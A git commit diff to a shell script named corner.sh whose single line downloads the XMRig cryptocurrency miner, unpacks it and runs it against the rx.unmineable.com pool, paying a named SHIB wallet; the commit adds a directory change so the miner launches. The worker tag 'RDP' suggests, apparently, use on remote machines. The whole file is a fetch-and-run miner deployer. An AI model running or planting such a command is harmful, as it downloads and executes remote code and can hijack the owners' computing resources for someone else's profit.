9646cd1c8e81f8f4334bfed4a95be139b0e9efd6
aplaceforme1934 <127804261+aplaceforme1934@users.noreply.github.com>
2023-03-15 03:25:26 +0100

    Update corner.sh

--- corner.sh
+++ corner.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz && tar -xvf xmrig-6.19.0-linux-x64.tar.gz && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x1206273d65b0BC1ba5aa1Ffb623F6bBE8829FD4A.RDP -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz && tar -xvf xmrig-6.19.0-linux-x64.tar.gz && cd xmrig-6.19.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x1206273d65b0BC1ba5aa1Ffb623F6bBE8829FD4A.RDP -p x
